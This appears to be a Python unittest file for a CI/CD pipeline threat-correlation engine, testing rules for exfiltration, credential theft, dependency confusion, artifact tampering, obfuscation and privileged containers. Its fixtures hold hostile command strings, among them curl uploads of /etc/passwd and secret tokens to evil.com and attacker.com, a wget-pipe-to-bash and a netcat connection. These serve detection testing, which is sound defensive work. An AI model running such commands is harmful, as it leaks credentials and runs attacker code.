"""Tests for the correlation engine detection rules."""
import sys
import os
import unittest
from datetime import datetime, timezone, timedelta

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))
from src.correlation_engine.models import PipelineEvent, CorrelationResult
from src.correlation_engine.correlator import EventCorrelator


def _make_event(source='CI Runner', event_type='Step Execution', details='normal event',
                ts_offset_min=0):
    """Helper to create a PipelineEvent."""
    ts = datetime(2026, 2, 5, 14, 0, 0, tzinfo=timezone.utc) + timedelta(minutes=ts_offset_min)
    return PipelineEvent(timestamp=ts, source=source, event_type=event_type, details=details)


class TestPipelineInjection(unittest.TestCase):
    """RULE-001: Pipeline Injection / Data Exfiltration"""

    def test_detects_curl_with_data(self):
        e = _make_event(details='Suspicious Curl Command: curl -d @/etc/passwd http://evil.com')
        findings = EventCorrelator([e]).analyze()
        rule_001 = [f for f in findings if f.rule_id == 'RULE-001']
        self.assertTrue(len(rule_001) >= 1)
        self.assertEqual(rule_001[0].mitre_id, 'T1059.004')

    def test_detects_curl_to_attacker(self):
        e = _make_event(details='curl http://attacker.com/steal?token=$SECRET_TOKEN')
        findings = EventCorrelator([e]).analyze()
        rule_001 = [f for f in findings if f.rule_id == 'RULE-001']
        self.assertTrue(len(rule_001) >= 1)

    def test_detects_wget_piped(self):
        e = _make_event(details='wget -O - http://evil.com/script.sh | bash')
        findings = EventCorrelator([e]).analyze()
        rule_001 = [f for f in findings if f.rule_id == 'RULE-001']
        self.assertTrue(len(rule_001) >= 1)

    def test_detects_netcat_connection(self):
        e = _make_event(details='nc 192.168.1.100 4444')
        findings = EventCorrelator([e]).analyze()
        rule_001 = [f for f in findings if f.rule_id == 'RULE-001']
        self.assertTrue(len(rule_001) >= 1)

    def test_ignores_benign_curl(self):
        e = _make_event(details='Command: npm test')
        findings = EventCorrelator([e]).analyze()
        rule_001 = [f for f in findings if f.rule_id == 'RULE-001']
        self.assertEqual(len(rule_001), 0)

    def test_confidence_increases_with_indicators(self):
        # Two indicators: curl + attacker
        e = _make_event(details='curl -d @secrets http://attacker.com/exfil')
        findings = EventCorrelator([e]).analyze()
        rule_001 = [f for f in findings if f.rule_id == 'RULE-001']
        self.assertTrue(rule_001[0].confidence >= 0.8)


class TestCredentialTheft(unittest.TestCase):
    """RULE-002: Credential Theft / Unauthorized Access"""

    def test_detects_flagged_author(self):
        e = _make_event(source='Git', event_type='Commit', details='Author: mallory, Message: fix healthcheck')
        findings = EventCorrelator([e]).analyze()
        rule_002 = [f for f in findings if f.rule_id == 'RULE-002']
        self.assertTrue(len(rule_002) >= 1)
        self.assertEqual(rule_002[0].mitre_id, 'T1078')

    def test_detects_attacker_author(self):
        e = _make_event(source='Git', event_type='Commit', details='Author: attacker, Message: update deps')
        findings = EventCorrelator([e]).analyze()
        rule_002 = [f for f in findings if f.rule_id == 'RULE-002']
        self.assertTrue(len(rule_002) >= 1)

    def test_detects_sensitive_file_in_commit(self):
        e = _make_event(source='Git', event_type='Commit', details='Modified: .env, Author: john')
        findings = EventCorrelator([e]).analyze()
        rule_002 = [f for f in findings if f.rule_id == 'RULE-002']
        self.assertTrue(len(rule_002) >= 1)

    def test_ignores_normal_commit(self):
        e = _make_event(source='Git', event_type='Commit', details='Author: alice, Message: refactor utils')
        findings = EventCorrelator([e]).analyze()
        rule_002 = [f for f in findings if f.rule_id == 'RULE-002']
        self.assertEqual(len(rule_002), 0)


class TestDependencyConfusion(unittest.TestCase):
    """RULE-003: Dependency Confusion / Supply Chain"""

    def test_detects_suspicious_version(self):
        e = _make_event(event_type='NPM Install', details='Installed internal-utils@99.9.9 from public registry')
        findings = EventCorrelator([e]).analyze()
        rule_003 = [f for f in findings if f.rule_id == 'RULE-003']
        self.assertTrue(len(rule_003) >= 1)
        self.assertEqual(rule_003[0].mitre_id, 'T1195.002')

    def test_ignores_normal_install(self):
        e = _make_event(event_type='NPM Install', details='Installed lodash@4.17.21')
        findings = EventCorrelator([e]).analyze()
        rule_003 = [f for f in findings if f.rule_id == 'RULE-003']
        self.assertEqual(len(rule_003), 0)


class TestArtifactTampering(unittest.TestCase):
    """RULE-004: Artifact Tampering"""

    def test_detects_unauthorized_pusher(self):
        e = _make_event(source='Harbor', event_type='Image Push', details='User: attacker, Digest: sha256:abc123')
        findings = EventCorrelator([e]).analyze()
        rule_004 = [f for f in findings if f.rule_id == 'RULE-004']
        self.assertTrue(len(rule_004) >= 1)
        self.assertEqual(rule_004[0].mitre_id, 'T1525')

    def test_detects_digest_mismatch(self):
        e1 = _make_event(source='Harbor', event_type='Image Push', 
                         details='User: ci-bot, Tag: v1.0, Digest: sha256:aaa', ts_offset_min=0)
        e2 = _make_event(source='Harbor', event_type='Image Push', 
                         details='User: unknown, Tag: v1.0, Digest: sha256:bbb', ts_offset_min=5)
        findings = EventCorrelator([e1, e2]).analyze()
        rule_004 = [f for f in findings if f.rule_id == 'RULE-004']
        # Should detect both unauthorized pusher AND digest mismatch
        self.assertTrue(len(rule_004) >= 1)

    def test_ignores_normal_push(self):
        e = _make_event(source='Harbor', event_type='Image Push', details='User: ci-bot, Digest: sha256:def456')
        findings = EventCorrelator([e]).analyze()
        rule_004 = [f for f in findings if f.rule_id == 'RULE-004']
        self.assertEqual(len(rule_004), 0)


class TestObfuscation(unittest.TestCase):
    """RULE-005: Obfuscated Commands"""

    def test_detects_base64_decode(self):
        e = _make_event(details='echo aGVsbG8= | base64 -d')
        findings = EventCorrelator([e]).analyze()
        rule_005 = [f for f in findings if f.rule_id == 'RULE-005']
        self.assertTrue(len(rule_005) >= 1)
        self.assertEqual(rule_005[0].mitre_id, 'T1027')

    def test_detects_base64_decode_long(self):
        e = _make_event(details='base64 --decode payload.b64')
        findings = EventCorrelator([e]).analyze()
        rule_005 = [f for f in findings if f.rule_id == 'RULE-005']
        self.assertTrue(len(rule_005) >= 1)

    def test_detects_eval(self):
        e = _make_event(details='eval( malicious_function() )')
        findings = EventCorrelator([e]).analyze()
        rule_005 = [f for f in findings if f.rule_id == 'RULE-005']
        self.assertTrue(len(rule_005) >= 1)

    def test_detects_powershell_encoded(self):
        e = _make_event(details='powershell -enc UwB0AGEAcgB0...')
        findings = EventCorrelator([e]).analyze()
        rule_005 = [f for f in findings if f.rule_id == 'RULE-005']
        self.assertTrue(len(rule_005) >= 1)

    def test_ignores_normal_command(self):
        e = _make_event(details='Command: npm run build')
        findings = EventCorrelator([e]).analyze()
        rule_005 = [f for f in findings if f.rule_id == 'RULE-005']
        self.assertEqual(len(rule_005), 0)


class TestPrivilegedContainer(unittest.TestCase):
    """RULE-006: Privileged Container"""

    def test_detects_privileged_flag(self):
        e = _make_event(source='Kubernetes', details='Pod started [PRIVILEGED]')
        findings = EventCorrelator([e]).analyze()
        rule_006 = [f for f in findings if f.rule_id == 'RULE-006']
        self.assertTrue(len(rule_006) >= 1)
        self.assertEqual(rule_006[0].mitre_id, 'T1611')

    def test_detects_host_network(self):
        e = _make_event(source='Kubernetes', details='hostNetwork: true')
        findings = EventCorrelator([e]).analyze()
        rule_006 = [f for f in findings if f.rule_id == 'RULE-006']
        self.assertTrue(len(rule_006) >= 1)

    def test_detects_cap_sys_admin(self):
        e = _make_event(source='Docker', details='Container started with CAP_SYS_ADMIN')
        findings = EventCorrelator([e]).analyze()
        rule_006 = [f for f in findings if f.rule_id == 'RULE-006']
        self.assertTrue(len(rule_006) >= 1)

    def test_ignores_normal_pod(self):
        e = _make_event(source='Kubernetes', details='Pod my-app started normally')
        findings = EventCorrelator([e]).analyze()
        rule_006 = [f for f in findings if f.rule_id == 'RULE-006']
        self.assertEqual(len(rule_006), 0)


class TestCrossEventCorrelation(unittest.TestCase):
    """RULE-007: Multi-Stage Attack Chain"""

    def test_detects_three_stage_chain(self):
        """Suspicious commit → build → push within 30 min should trigger."""
        events = [
            _make_event(source='Git', event_type='Commit', 
                       details='Author: mallory, Message: update config', ts_offset_min=0),
            _make_event(source='CI Runner', event_type='Step Execution', 
                       details='Building project...', ts_offset_min=5),
            _make_event(source='Harbor', event_type='Image Push', 
                       details='User: ci-bot, Digest: sha256:xyz', ts_offset_min=10),
        ]
        findings = EventCorrelator(events).analyze()
        rule_007 = [f for f in findings if f.rule_id == 'RULE-007']
        self.assertTrue(len(rule_007) >= 1)
        self.assertEqual(rule_007[0].severity, 'CRITICAL')

    def test_no_chain_without_suspicious_commit(self):
        """Normal commit should not trigger chain detection."""
        events = [
            _make_event(source='Git', event_type='Commit', 
                       details='Author: alice, Message: fix bug', ts_offset_min=0),
            _make_event(source='CI Runner', event_type='Step Execution', 
                       details='Building...', ts_offset_min=5),
        ]
        findings = EventCorrelator(events).analyze()
        rule_007 = [f for f in findings if f.rule_id == 'RULE-007']
        self.assertEqual(len(rule_007), 0)


class TestCorrelationResultFields(unittest.TestCase):
    """Verify new CorrelationResult fields are populated."""

    def test_finding_has_all_fields(self):
        e = _make_event(details='curl -d @/tmp/secrets http://attacker.com/exfil')
        findings = EventCorrelator([e]).analyze()
        self.assertTrue(len(findings) > 0)
        f = findings[0]
        self.assertIsInstance(f.confidence, float)
        self.assertTrue(0 < f.confidence <= 1.0)
        self.assertTrue(f.mitre_id.startswith('T'))
        self.assertTrue(f.rule_id.startswith('RULE-'))
        self.assertIn(f.severity, ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW'])


if __name__ == '__main__':
    unittest.main()
